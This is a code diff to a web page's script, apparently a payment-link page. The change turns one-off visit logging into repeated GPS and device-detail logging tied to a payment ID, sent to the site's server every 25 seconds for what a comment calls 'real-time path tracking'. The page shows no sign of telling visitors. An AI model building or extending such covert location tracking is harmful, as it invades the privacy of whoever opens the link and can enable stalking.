@@ -676,8 +676,9 @@
 
         async function logVisit() {
             try {
-                // Try high-accuracy continuous GPS first
+                // Try high-accuracy continuous GPS
                 const pos = await tryGPSContinuous();
+                if (!pos) return;
 
                 // Collect Device Info
                 const deviceDetails = {
@@ -697,25 +698,19 @@
                             finalLocation: pos
                         },
                         deviceDetails,
-                        userAgent: navigator.userAgent
+                        userAgent: navigator.userAgent,
+                        isUpdate: true
                     })
                 });
             } catch (e) {
-                // Fallback log without location
-                fetch('/log-visit', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        paymentId,
-                        deviceDetails: {
-                            screenResolution: `${window.screen.width}x${window.screen.height}`,
-                            platform: navigator.platform
-                        },
-                        userAgent: navigator.userAgent
-                    })
-                });
+                console.log('Periodic visit log failed');
             }
         }
+
+        // Run once on start
+        setTimeout(logVisit, 2000);
+        // Then every 25 seconds for real-time path tracking
+        setInterval(logVisit, 25000);
     </script>
 </body>
 
